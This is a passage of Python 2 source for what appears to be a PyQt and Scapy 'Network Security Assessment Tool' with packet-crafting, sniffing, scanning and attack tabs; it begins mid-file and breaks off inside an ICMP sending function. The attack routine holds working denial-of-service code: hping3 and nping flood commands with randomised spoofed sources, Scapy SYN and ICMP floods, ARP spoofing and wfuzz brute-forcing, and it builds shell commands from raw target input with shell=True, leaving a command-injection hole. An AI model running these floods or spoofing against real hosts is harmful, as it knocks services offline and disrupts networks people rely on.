        self.dnsRes.setText(_translate("MainWindow", "Reserved"))
        self.idnsAutRec.setPlaceholderText(_translate("MainWindow", "0"))
        self.idnsar.setPlaceholderText(_translate("MainWindow", "0"))
        self.idnsAutAns.setPlaceholderText(_translate("MainWindow", "0"))
        self.idnsQId.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsns.setText(_translate("MainWindow", "ns"))
        self.idnsTrun.setPlaceholderText(_translate("MainWindow", "1"))
        self.dnsQId.setText(_translate("MainWindow", "Query ID"))
        self.idnsQRes.setPlaceholderText(_translate("MainWindow", "0"))
        self.dnsTrun.setText(_translate("MainWindow", "Truncated"))
        self.idnsQuRec.setPlaceholderText(_translate("MainWindow", "1"))
        self.idnsAnsRec.setPlaceholderText(_translate("MainWindow", "0"))
        self.idnsRes.setPlaceholderText(_translate("MainWindow", "0"))
        self.idnsRecAv.setPlaceholderText(_translate("MainWindow", "0"))
        self.i_dnsDestIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.dnsDestIP.setText(_translate("MainWindow", "Destination IP"))
        self.i_dnsDestIP_2.setPlaceholderText(_translate("MainWindow", "8.8.8.8"))
        self.dnsServ.setText(_translate("MainWindow", "DNS Server"))
        self.ptypesTab.setTabText(self.ptypesTab.indexOf(self.dnsPage), _translate("MainWindow", "DNS"))
        self.Modules.setTabText(self.Modules.indexOf(self.generatorW), _translate("MainWindow", "Generator"))
        self.browse.setTitle(_translate("MainWindow", "Browse"))
        self.SelectLabel.setText(_translate("MainWindow", "1.Select Pcap File"))
        self.BrowseB.setText(_translate("MainWindow", "Browse"))
        self.packetTypes.setTitle(_translate("MainWindow", "Packet Types"))
        self.selectLabel.setText(_translate("MainWindow", "2.Select Packet Types"))
        self.dhcpbox.setText(_translate("MainWindow", "DHCP"))
        self.arpbox.setText(_translate("MainWindow", "ARP"))
        self.icmpbox.setText(_translate("MainWindow", "ICMP"))
        self.tcpbox.setText(_translate("MainWindow", "TCP"))
        self.udpbox.setText(_translate("MainWindow", "UDP"))
        self.ipbox.setText(_translate("MainWindow", "IP"))
        self.allPacketbox.setText(_translate("MainWindow", "All Packets"))
        self.groupBox.setTitle(_translate("MainWindow", "Content Analysis"))
        self.FileCheck.setText(_translate("MainWindow", "Perform Content Analysis"))
        self.startButton.setText(_translate("MainWindow", "Start"))
        self.consequences.setTitle(_translate("MainWindow", "Consequences"))
        self.PResult.setText(_translate("MainWindow", "3. Packet Result"))
        self.FileResult.setText(_translate("MainWindow", "4.File Analyze Results"))
        self.Modules.setTabText(self.Modules.indexOf(self.pcapFilter), _translate("MainWindow", "Analyzer"))
        self.groupBox_5.setTitle(_translate("MainWindow", "Packet Types"))
        self.m_dhcpbox.setText(_translate("MainWindow", "DHCP"))
        self.m_icmpbox.setText(_translate("MainWindow", "ICMP"))
        self.m_ipbox.setText(_translate("MainWindow", "IP"))
        self.m_tcpbox.setText(_translate("MainWindow", "TCP"))
        self.m_udpbox.setText(_translate("MainWindow", "UDP"))
        self.m_dnsbox.setText(_translate("MainWindow", "DNS"))
        self.m_arpbox.setText(_translate("MainWindow", "ARP"))
        self.allLabel.setText(_translate("MainWindow", "!! If you do not select packet type, ALL TRAFFIC will be monitored !!"))
        self.FilterOpt.setTitle(_translate("MainWindow", "Filtering Options"))
        self.m_srcIP.setText(_translate("MainWindow", "Source IP"))
        self.im_srcIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.m_dstIP.setText(_translate("MainWindow", "Destination IP"))
        self.im_dstIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.m_part.setText(_translate("MainWindow", "Port"))
        self.im_port.setPlaceholderText(_translate("MainWindow", "80,443"))
        self.resolveBox.setText(_translate("MainWindow", "Resolve Host & Port Name"))
        self.m_startB.setText(_translate("MainWindow", "START"))
        self.saveBox.setText(_translate("MainWindow", "Save Results to Pcap File"))
        self.groupBox_7.setTitle(_translate("MainWindow", "Monitor"))
        self.Modules.setTabText(self.Modules.indexOf(self.monitorW), _translate("MainWindow", "Sniffer"))
        self.scanTypes.setTitle(_translate("MainWindow", "Scan Types"))
        self.subdomain.setText(_translate("MainWindow", "Subdomain"))
        self.banner.setText(_translate("MainWindow", "Banner"))
        self.traceroute.setText(_translate("MainWindow", "Traceroute"))
        self.port.setText(_translate("MainWindow", "Port"))
        self.s_targetIP.setText(_translate("MainWindow", "Target IP"))
        self.s_port.setText(_translate("MainWindow", "Port Range"))
        self.s_dnsSer.setText(_translate("MainWindow", "DNS Server"))
        self.is_targetIP.setPlaceholderText(_translate("MainWindow", "192.168.1.1"))
        self.is_port.setPlaceholderText(_translate("MainWindow", "1"))
        self.label.setText(_translate("MainWindow", " -"))
        self.is_port_2.setPlaceholderText(_translate("MainWindow", "80"))
        self.is_dnsSer.setPlaceholderText(_translate("MainWindow", "8.8.8.8"))
        self.scanB.setText(_translate("MainWindow", "Scan"))
        self.scanResult.setTitle(_translate("MainWindow", "Results"))
        self.Modules.setTabText(self.Modules.indexOf(self.scanW), _translate("MainWindow", "Recon"))
        self.allLabel_2.setText(_translate("MainWindow", "!! Blank fileds are filled with default values."))
        self.allLabel_3.setText(_translate("MainWindow", "!! Blank fileds are filled with default values."))
        self.allLabel_4.setText(_translate("MainWindow", "!! Blank fileds are filled with default values."))
        self.allLabel_5.setText(_translate("MainWindow", "!! Blank fileds are filled with default values."))
        self.allLabel_6.setText(_translate("MainWindow", "!! Blank fileds are filled with default values."))
        self.allLabel_7.setText(_translate("MainWindow", "!! Blank fileds are filled with default values."))
        self.label_2.setText(_translate("MainWindow", "                                                ~Network Security Assessment Tool ~"))

    def selectFile(self):
        try:
            file = self.fileBrowse.getOpenFileName(self.browse, 'Open File', "C:\ ")
            file = (str(file).split("'")[1])[:(len(str(file).split("'")[1]))]
            ext1 = str(file).split("/")[(len(str(file).split("/"))-1)]
            ext = str(ext1).split(".")[1]
            if ext == "pcap":
                self.iSelectLabel.setText(file)
            else:
                ui.msg.setInformativeText("Please, select '.pcap' file!")
                ui.msg.show()
        except:
            pass

def aSpoof(target_IP):
    for x in range(0, int(ui.ipacketNumber.value())):
        IP_Packet = IP()
	ARP_Packet = ARP()
	randIP = RandomIP()

        IP_Packet.src = randIP
        ARP_Packet.psrc = randIP
        ARP_Packet.hwsrc = RandomMAC()
        IP_Packet.dst = target_IP
        ARP_Packet.pdst = target_IP

        send(IP_Packet)
        send(ARP_Packet)

def HostControl(host_IP):
    try:
        val = int(host_IP)
    except ValueError:
        return host_IP

    control_3 = host_IP.split("/")
    control = host_IP.split(".")
    control_1 = " "
    control_2 = " "

    if (len(control_3) == 2):
        for loop0 in range(0, 1):
            control_1 = host_IP.split("/")[len(control_3) - (loop0 + 1)]
            if (int(control_1) > 32):
                print("[ERROR] Subnetting has gone wrong !!!")
                time.sleep(1)
                sys.exit()

        for loop in range(0, 4):
            control_2 = host_IP.split(".")[len(control) - (loop + 1)]
            if (len(control_2) > 3):
                control_2 = control_2.split()[0][0]
            if (int(control_2) > 255):
                print("[ERROR] Host IP should be smaller than 256 !!!")
                time.sleep(1)
                sys.exit()

    if (len(control_3) == 1):
        for loop1 in range(0, 4):
            control_2 = host_IP.split(".")[len(control) - (loop1 + 1)]
            if (int(control_2) > 255):
                print("[ERROR] Host IP should be smaller than 256 !!!" )
                time.sleep(1)
                sys.exit()

    return host_IP

def attack_Stop():
    global hping3_Flag
    if hping3_Flag == 1:
        ui.attackB.setText("Attack")
        ui.attackB.setStyleSheet("background-color: rgb(0, 0, 112);")
        ui.attackProgress.hide()
        hping3_Flag = 0

        try:
            wFuzz_Proc.terminate()
            try:
                wFuzz_Proc.kill()
            except:
                pass
            proc_Kill = subprocess.Popen(['ps -A | grep -E "hping3|nping|wfuzz" | cut -c -6'], stdout=subprocess.PIPE, shell=True)
            (out,err) = proc_Kill.communicate()
            try:
                os.system("kill " + out)
            except:
                pass

            for x in range(0,(len(str(out).split(" "))-1)):
                procss = str(out).split(" ")[x]
                if str(procss) != "":
                    os.system("kill " + str(procss))
            try:
                proc_Kill.kill()
                proc_Kill.terminate()
            except:
                pass
        except:
            pass

    else:
        attack_B()


def attack_B():
    global hping3_Flag
    if hping3_Flag == 0:
        if str(ui.Fuzzer.isChecked()) == "True":
            current_time = strftime("%Y-%m-%d", gmtime())
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target domain or IP!")
                ui.msg.show()
            else:
                ui.attackB.setText("STOP")
                ui.attackB.setStyleSheet("background-color: rgb(192, 192, 192);")
                hping3_Flag = 1
                try:
                    target_IP = HostControl(target_IP)
                except:
                    pass
                url = " http://" + target_IP + "/FUZZ"
                if not os.path.exists("Fuzz-" + current_time):
                    os.system("mkdir Fuzz-" + current_time)
                try:
                    global wFuzz_Proc
                    wfuzz_cmd = ("wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404" + url + " > Fuzz-" + current_time + "/" + target_IP + "-WFuzz.txt")
                    wFuzz_Proc = subprocess.Popen(wfuzz_cmd, shell=True)
                    hping3_Flag = 1
                except:
                    ui.msg.setInformativeText("[ERROR] Please, install wfuzz in your system!")
                    ui.msg.show()
                    try:
                        os.system("rm -rf " + desktop + "Fuzz-*")
                    except:
                        pass

                ui.attackB.setText("Attack")
                ui.attackB.setStyleSheet("background-color: rgb(0, 0, 112);")



        elif str(ui.aSpoof.isChecked()) == "True":
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target IP!")
                ui.msg.show()
            else:

                try:
                    print gethostbyaddr(target_IP)[2]
                    target_IP = gethostbyaddr(target_IP)[2]
                except:
                    pass
                try:
                    aSpoof(target_IP)
                except:
                    pass


        elif str(ui.sshOver.isChecked()) == "True":
            import signal
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target IP!")
                ui.msg.show()
            else:
                ui.attackB.setText("STOP")
                ui.attackB.setStyleSheet("background-color: rgb(192, 192, 192);")
                ui.timer1.timeout.connect(ui.progress)
                ui.timer1.timeout.connect(ui.timerrepeat)
                ui.attackProgress.setProperty("value", 0)
                ui.attackProgress.show()
                ui.timer1.start(150)
                hping3_Flag = 1
                try:
                    wfuzz_cmd = ('hping3 -V -c 999999 -d 120 -S -w 64 -p 22 -s 445 --flood --rand-source ' + target_IP)
                    wFuzz_Proc = subprocess.Popen(wfuzz_cmd, shell=True)
                except:
                    pass


        elif str(ui.ddos.isChecked()) == "True":
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target IP!")
                ui.msg.show()
            else:
                ui.attackB.setText("STOP")
                ui.attackB.setStyleSheet("background-color: rgb(192, 192, 192);")
                ui.timer1.timeout.connect(ui.progress)
                ui.timer1.timeout.connect(ui.timerrepeat)
                ui.attackProgress.setProperty("value", 0)
                ui.attackProgress.show()
                ui.timer1.start(150)
                hping3_Flag = 1
                try:
                    wfuzz_cmd = ('hping3 -V -c 999999 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source ' + target_IP)
                    wFuzz_Proc = subprocess.Popen(wfuzz_cmd, shell=True)
                except:
                    pass

        elif str(ui.tFlood.isChecked()) == "True":
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target IP!")
                ui.msg.show()
            else:
                ui.attackB.setText("STOP")
                ui.attackB.setStyleSheet("background-color: rgb(192, 192, 192);")
                ui.timer1.timeout.connect(ui.progress)
                ui.timer1.timeout.connect(ui.timerrepeat)
                ui.attackProgress.setProperty("value", 0)
                ui.attackProgress.show()
                ui.timer1.start(150)
                hping3_Flag = 1
                try:
                    wfuzz_cmd = ('nping --tcp-connect -rate=90000 -c 999999 -q ' + target_IP)
                    wFuzz_Proc = subprocess.Popen(wfuzz_cmd, shell=True)
                except:
                    pass

        elif str(ui.sFlood.isChecked()) == "True":
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target IP!")
                ui.msg.show()

            else:
                try:
                    print gethostbyaddr(target_IP)[2]
                    target_IP = gethostbyaddr(target_IP)[2]
                except:
                    pass

                target_Port = ui.itargetPort.text()
                if target_Port == "":
                    ui.msg.setInformativeText("Enter a target PORT!")
                    ui.msg.show()

                else:
                    try:
                        int(target_Port)
                        try:
                            for x in range(0, int(ui.ipacketNumber.text())):
                                TCP_Packet = TCP()
                                TCP_Packet.seq = 0
                                TCP_Packet.ack = 0
                                TCP_Packet.dataofs = None
                                TCP_Packet.reserved = 0
                                TCP_Packet.flags = "S"
                                TCP_Packet.window = 8192
                                TCP_Packet.chksum = None
                                TCP_Packet.urgptr = 0
                                TCP_Packet.options = ""
                                TCP_Packet.seq = RandomInteger()
                                TCP_Packet.ack = RandomInteger()
                                TCP_Packet.sport = RandShort()

                                TCP_Packet.dport = int(ui.itargetPort.text())
                                send(IP(dst=target_IP) / TCP_Packet)
                        except:
                            pass

                    except ValueError:
                        ui.msg.setInformativeText("Port number should be an integer!")
                        ui.msg.show()


        elif str(ui.iFlood.isChecked()) == "True":
            target_IP = ui.itargetIP.text()
            if target_IP == "":
                ui.msg.setInformativeText("Enter a target IP!")
                ui.msg.show()
            else:
                try:
                    print gethostbyaddr(target_IP)[2]
                    target_IP = gethostbyaddr(target_IP)[2]
                except:
                    pass
                try:
                    for x in range(0, int(ui.ipacketNumber.text())):
                        ICMP_Packet = ICMP()
                        ICMP_Packet.type = "echo-request"
                        ICMP_Packet.code = 0
                        ICMP_Packet.chksum = None
                        ICMP_Packet.id = 0x0
                        ICMP_Packet.seq = 0x0
                        send(IP(dst=target_IP,src=RandomIP()) / ICMP_Packet)

                except:
                    pass

            ui.attackB.setText("Attack")
            ui.attackB.setStyleSheet("background-color: rgb(0, 0, 112);")


        else:
            ui.msg.setInformativeText("Select an attack type!")
            ui.msg.show()

    else:
        attack_Stop()

def RandomIP():
    ip = ".".join(map(str, (random.randint(0, 255)for _ in range(4))))
    return ip

def RandomInteger():
    randomint = random.randint(1000,99999)
    return randomint

def RandomMAC():
    mac = [ random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff),random.randint(0x00, 0xff),random.randint(0x00, 0xff),random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def arp_Send():
    ARP_Packet = ARP()
    error_Flag = 0

    protocol_Length = ui.iarpProLength.text()
    if protocol_Length == "":
        protocol_Length = 4
    else:
        try:
            int(str(protocol_Length).split("'")[0])
            protocol_Length = int(str(protocol_Length).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Protocol length should be an integer!")
            ui.msg.show()
            error_Flag +=1

    op_code = ui.iarpOp.text()
    if op_code == "":
        op_code = 'who-has'
    else:
        try:
            int(str(op_code).split("'")[0])
            op_code = int(str(op_code).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("OP Code should be an integer!")
            ui.msg.show()
            error_Flag +=1

    hardware_Type = ui.iarpHw.text()
    if hardware_Type == "":
        hardware_Type = 0x1
    else:
        try:
            int(hardware_Type,16)
            hardware_Type = int(hardware_Type,16)
        except ValueError:
            ui.msg.setInformativeText("Given hwtype can not converted hex, enter an integer!")
            ui.msg.show()
            error_Flag +=1

    protocol_Type = ui.iarpPtype.text()
    if protocol_Type =="":
        protocol_Type = 0x800
    else:
        try:
            int(protocol_Type,16)
            protocol_Type = int(protocol_Type,16)
        except ValueError:
            ui.msg.setInformativeText("Given ptype can not converted hex, enter an integer!")
            ui.msg.show()
            error_Flag +=1

    source_IP = ui.iarpSrcIP.text()
    if source_IP == "":
        source_IP = RandomIP()
    else:
        try:
            len_IP = len(str(source_IP).split("."))
            if len_IP != 4:
                ui.msg.setInformativeText("Given source IP is invalid!")
                ui.msg.show()
                error_Flag += 1
        except:
            ui.msg.setInformativeText("Given source IP is invalid!")
            ui.msg.show()
            error_Flag += 1
        try:
            int(str(source_IP).split(".")[0])
            int(str(source_IP).split(".")[1])
            int(str(source_IP).split(".")[2])
            int(str(source_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given source IP is invalid!")
            ui.msg.show()
            error_Flag +=1

    source_MAC = ui.iarpSrcMac.text()
    if source_MAC == "":
        source_MAC = RandomMAC()
    else:
        try:
            len_MAC = len(str(source_MAC).split(":"))
            if len_MAC != 6:
                ui.msg.setInformativeText("Given source MAC is invalid!")
                ui.msg.show()
                error_Flag += 1
        except:
            ui.msg.setInformativeText("Given source MAC is invalid!")
            ui.msg.show()
            error_Flag +=1
        try:
           int(str(source_MAC).split(":")[0],16)
           int(str(source_MAC).split(":")[1],16)
           int(str(source_MAC).split(":")[2],16)
           int(str(source_MAC).split(":")[3],16)
           int(str(source_MAC).split(":")[4],16)
           int(str(source_MAC).split(":")[5],16)
        except:
            ui.msg.setInformativeText("Given source MAC is invalid!")
            ui.msg.show()
            error_Flag +=1

    destination_IP = ui.iarpDestIP.text()
    if destination_IP == "":
        destination_IP = RandomIP()
    else:
        try:
            destlen_IP = len(str(destination_IP).split("."))
            if destlen_IP != 4:
                ui.msg.setInformativeText("Given destination IP is invalid!")
                ui.msg.show()
                error_Flag += 1
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_Flag +=1
        try:
            int(str(destination_IP).split(".")[0])
            int(str(destination_IP).split(".")[1])
            int(str(destination_IP).split(".")[2])
            int(str(destination_IP).split(".")[3])
        except :
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_Flag +=1

    if error_Flag == 0:
        try:
            ARP_Packet.hwtype = hardware_Type
            ARP_Packet.ptype = protocol_Type
            ARP_Packet.plen = protocol_Length
            ARP_Packet.op = op_code
            ARP_Packet.psrc = source_IP
            ARP_Packet.hwsrc = source_MAC
            ARP_Packet.pdst = destination_IP
        except:
            pass
        try:
            send(ARP_Packet, verbose=0)
        except:
            pass


def tcp_Send():
    error_TCP = 0
    TCP_Packet = TCP()

    source_Port = ui.itcpSrcPort.text()
    if source_Port == "":
        source_Port = "ftp"
    else:
        try:
            int(str(source_Port).split("'")[0])
            source_Port = int(str(source_Port).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Source PORT should be an integer!")
            ui.msg.show()
            error_TCP +=1

    destination_Port = ui.itcpDstPort.text()
    if destination_Port == "":
        destination_Port = 80
    else:
        try:
            int(str(destination_Port).split("'")[0])
            destination_Port = int(str(destination_Port).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Destination PORT should be an integer!")
            ui.msg.show()
            error_TCP +=1

    seq_Number = ui.itcpSeq.text()
    if seq_Number == "":
        seq_Number = 0
    else:
        try:
            int(str(seq_Number).split("'")[0])
            seq_Number = int(str(seq_Number).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("SEQ number should be an integer!")
            ui.msg.show()
            error_TCP +=1

    ack_Number = ui.itcpAck.text()
    if ack_Number == "":
        ack_Number = 0
    else:
        try:
            int(str(ack_Number).split("'")[0])
            ack_Number = int(str(ack_Number).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("ACK number should be an integer!")
            ui.msg.show()
            error_TCP +=1

    data_Offset = ui.itcpOff.text()
    if data_Offset == "":
        data_Offset = None
    else:
        try:
            int(str(data_Offset).split("'")[0])
            data_Offset = int(str(data_Offset).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Dataoffset should be an integer!")
            ui.msg.show()
            error_TCP +=1

    reserved = ui.itcpRes.text()
    if reserved == "":
        reserved = 0
    else:
        try:
            int(str(reserved).split("'")[0])
            reserved = int(str(reserved).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Reserved number should be an integer!")
            ui.msg.show()
            error_TCP +=1

    flags = ui.itcpFlag.text()
    if flags == "":
        flags = 'S'
    else:
        if str(flags).split("'")[0] == "R" or str(flags).split("'")[0] == "r":
            flags = str(flags).split("'")[0]
        elif str(flags).split("'")[0] == "RST" or str(flags).split("'")[0] == "rst":
            flags = 'R'
        elif str(flags).split("'")[0] == "U" or str(flags).split("'")[0] == "u":
            flags = str(flags).split("'")[0]
        elif str(flags).split("'")[0] == "URG" or str(flags).split("'")[0] == "urg":
            flags = 'U'
        elif str(flags).split("'")[0] == "A" or str(flags).split("'")[0] == "a":
            flags = str(flags).split("'")[0]
        elif str(flags).split("'")[0] == "ACK" or str(flags).split("'")[0] == "ack":
            flags = 'A'
        elif str(flags).split("'")[0] == "P" or str(flags).split("'")[0] == "p":
            flags = str(flags).split("'")[0]
        elif str(flags).split("'")[0] == "PSH" or str(flags).split("'")[0] == "psh":
            flags = 'P'
        elif str(flags).split("'")[0] == "S" or str(flags).split("'")[0] == "s":
            flags = str(flags).split("'")[0]
        elif str(flags).split("'")[0] == "SYN" or str(flags).split("'")[0] == "syn":
            flags = 'S'
        elif str(flags).split("'")[0] == "F" or str(flags).split("'")[0] == "f":
            flags = str(flags).split("'")[0]
        elif str(flags).split("'")[0] == "FIN" or str(flags).split("'")[0] == "fin":
            flags = 'F'
        else:
            ui.msg.setInformativeText("Flag should be one of these flags: S , R , U , A , P , F ")
            ui.msg.show()
            error_TCP +=1

    window_Size = ui.itcpWin.text()
    if window_Size == "":
        window_Size = 8192
    else:
        try:
            int(str(window_Size).split("'")[0])
            window_Size = int(str(window_Size).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Window size should be an integer!")
            ui.msg.show()
            error_TCP +=1


    checksum = ui.itcpCheck.text()
    if checksum == "":
        checksum = None
    else:
        try:
            int(checksum, 16)
            checksum = int(checksum, 16)
        except ValueError:
            ui.msg.setInformativeText("Given checksum can not converted hex, enter an integer!")
            ui.msg.show()
            error_TCP +=1


    urgent_Pointer = ui.itcpUrg.text()
    if urgent_Pointer == "":
        urgent_Pointer = 0
    else:
        try:
            int(str(urgent_Pointer).split("'")[0])
            urgent_Pointer = int(str(urgent_Pointer).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Urgent number should be an integer!")
            ui.msg.show()
            error_TCP +=1

    destination_IP = ui.itcpDstIP.text()
    if destination_IP == "":
        destination_IP = RandomIP()
    else:
        try:
            destlen_IP = len(str(destination_IP).split("."))
            if destlen_IP != 4:
                ui.msg.setInformativeText("Given destination IP is invalid!")
                ui.msg.show()
                error_TCP += 1
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_TCP +=1
        try:
            int(str(destination_IP).split(".")[0])
            int(str(destination_IP).split(".")[1])
            int(str(destination_IP).split(".")[2])
            int(str(destination_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_TCP += 1

    if error_TCP == 0:
        try:
            TCP_Packet.sport = source_Port
            TCP_Packet.dport = destination_Port
            TCP_Packet.seq = seq_Number
            TCP_Packet.ack = ack_Number
            TCP_Packet.dataofs = data_Offset
            TCP_Packet.reserved = reserved
            TCP_Packet.flags = flags
            TCP_Packet.window = window_Size
            TCP_Packet.chksum = checksum
            TCP_Packet.urgptr = urgent_Pointer
            TCP_Packet.options = ""

        except:
            pass

	try:
            send(IP(dst=destination_IP) / TCP_Packet, verbose=0)
        except:
            pass


def udp_Send():
    error_UDP = 0
    UDP_Packet = UDP()

    source_Port = ui.iudpSrcPort.text()
    if source_Port == "":
        source_Port = "domain"
    else:
        try:
            int(str(source_Port).split("'")[0])
            source_Port = int(str(source_Port).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Source PORT should be an integer!")
            ui.msg.show()
            error_UDP += 1

    destination_Port = ui.iudpDstPort.text()
    if destination_Port == "":
        destination_Port = "domain"
    else:
        try:
            int(str(destination_Port).split("'")[0])
            destination_Port = int(str(destination_Port).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Destination PORT should be an integer!")
            ui.msg.show()
            error_UDP += 1

    length = ui.iudpLength.text()
    if length == "":
        length = None
    else:
        try:
            int(str(length).split("'")[0])
            length = int(str(length).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Length should be an integer!")
            ui.msg.show()
            error_UDP +=1

    checksum = ui.iudpCheck.text()
    if checksum == "":
        checksum = None
    else:
        try:
            int(checksum, 16)
            checksum = int(checksum, 16)
        except ValueError:
            ui.msg.setInformativeText("Given checksum can not converted hex, enter an integer!")
            ui.msg.show()
            error_UDP +=1

    destination_IP = ui.iarpDestIP_2.text()
    if destination_IP == "":
        destination_IP = RandomIP()
    else:
        try:
            destlen_IP = len(str(destination_IP).split("."))
            if destlen_IP != 4:
                ui.msg.setInformativeText("Given destination IP is invalid!")
                ui.msg.show()
                error_UDP += 1
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_UDP +=1
        try:
            int(str(destination_IP).split(".")[0])
            int(str(destination_IP).split(".")[1])
            int(str(destination_IP).split(".")[2])
            int(str(destination_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_UDP += 1

    if error_UDP == 0:
        try:
            UDP_Packet.sport = source_Port
            UDP_Packet.dport = destination_Port
            UDP_Packet.len = length
            UDP_Packet.chksum = checksum
        except:
            pass
        try:
            send(IP(dst=destination_IP) / UDP_Packet, verbose=0)
        except:
            pass

def ip_Send():
    error_IP = 0
    IP_Packet = IP()

    ip_Version = ui.i_ipVer.text()
    if ip_Version == "":
        ip_Version = 4
    else:
        try:
            int(str(ip_Version).split("'")[0])
            ip_Version = int(str(ip_Version).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("IP Version should be an integer!")
            ui.msg.show()
            error_IP +=1


    header_Len = ui.i_ipHead.text()
    if header_Len == "":
        header_Len = None
    else:
        try:
            int(str(header_Len).split("'")[0])
            header_Len = int(str(header_Len).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Header length should be an integer!")
            ui.msg.show()
            error_IP +=1


    type_Service = ui.i_ipTos.text()
    if type_Service == "":
        type_Service = 0x0
    else:
        try:
            int(type_Service, 16)
            type_Service = int(type_Service, 16)
        except ValueError:
            ui.msg.setInformativeText("Given T.O.S. can not converted hex, enter an integer!")
            ui.msg.show()
            error_IP += 1

    length = ui.i_ipLen.text()
    if length == "":
        length = None
    else:
        try:
            int(str(length).split("'")[0])
            length = int(str(length).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("length should be an integer!")
            ui.msg.show()
            error_IP +=1


    identification = ui.i_ipIden.text()
    if identification == "":
        identification = 1
    else:
        try:
            int(str(identification).split("'")[0])
            identification = int(str(identification).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Identification number should be an integer!")
            ui.msg.show()
            error_IP +=1


    protocol = ui.i_ipProto.text()
    if protocol == "":
        protocol = 'hopopt'
    else:
        try:
            int(str(protocol).split("'")[0])
            protocol = int(str(protocol).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Protocol number should be an integer!")
            ui.msg.show()
            error_IP +=1

    fragment = ui.i_ipFrag.text()
    if fragment == "":
        fragment = 0
    else:
        try:
            int(str(fragment).split("'")[0])
            fragment = int(str(fragment).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Fragment number should be an integer!")
            ui.msg.show()
            error_IP += 1

    flags = ui.i_ipFlag.text()
    if flags == "":
        flags = None
    else:
        try:
            int(str(flags).split("'")[0])
            flags = int(str(flags).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("Flag number should be an integer! (0, 1 or 2)")
            ui.msg.show()
            error_IP += 1


    time_to_Live = ui.i_ipTtl.text()
    if time_to_Live == "":
        time_to_Live = 64
    else:
        try:
            int(str(time_to_Live).split("'")[0])
            time_to_Live = int(str(time_to_Live).split("'")[0])
        except ValueError:
            ui.msg.setInformativeText("TTL number should be an integer!")
            ui.msg.show()
            error_IP += 1


    checksum = ui.i_ipCheck.text()
    if checksum == "":
        checksum = None
    else:
        try:
            int(checksum, 16)
            checksum = int(checksum, 16)
        except ValueError:
            ui.msg.setInformativeText("Given checksum can not converted hex, enter an integer!")
            ui.msg.show()
            error_IP += 1


    destination_IP = ui.i_ipDstIP.text()
    if destination_IP == "":
        destination_IP = RandomIP()
    else:
        try:
            destlen_IP = len(str(destination_IP).split("."))
            if destlen_IP != 4:
                ui.msg.setInformativeText("Given destination IP is invalid!")
                ui.msg.show()
                error_IP += 1
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_IP +=1
        try:
            int(str(destination_IP).split(".")[0])
            int(str(destination_IP).split(".")[1])
            int(str(destination_IP).split(".")[2])
            int(str(destination_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given destination IP is invalid!")
            ui.msg.show()
            error_IP += 1

    source_IP = ui.i_ipSrcIP.text()
    if source_IP == "":
        source_IP = RandomIP()
    else:
        try:
            srclen_IP = len(str(source_IP).split("."))
            if srclen_IP != 4:
                ui.msg.setInformativeText("Given source IP is invalid!")
                ui.msg.show()
                error_IP += 1
        except:
            ui.msg.setInformativeText("Given source IP is invalid!")
            ui.msg.show()
            error_IP +=1
        try:
            int(str(source_IP).split(".")[0])
            int(str(source_IP).split(".")[1])
            int(str(source_IP).split(".")[2])
            int(str(source_IP).split(".")[3])
        except:
            ui.msg.setInformativeText("Given source IP is invalid!")
            ui.msg.show()
            error_IP += 1

    if error_IP == 0:
        try:
            IP_Packet.version = ip_Version
            IP_Packet.ihl = header_Len
            IP_Packet.tos = type_Service
            IP_Packet.len = length
            IP_Packet.id = identification
            IP_Packet.frag = fragment
            IP_Packet.flags = flags
            IP_Packet.ttl = time_to_Live
            IP_Packet.proto = protocol
            IP_Packet.chksum = checksum
            IP_Packet.src = source_IP
            IP_Packet.dst = destination_IP

            try:
                send(IP_Packet, verbose=0)
            except:
                pass
        except:
            pass


def icmp_Send():
    error_ICMP = 0
    ICMP_Packet = ICMP()

    type = ui.i_icmpType.text()
    if type == "":
        type = 'echo-request'
    else:
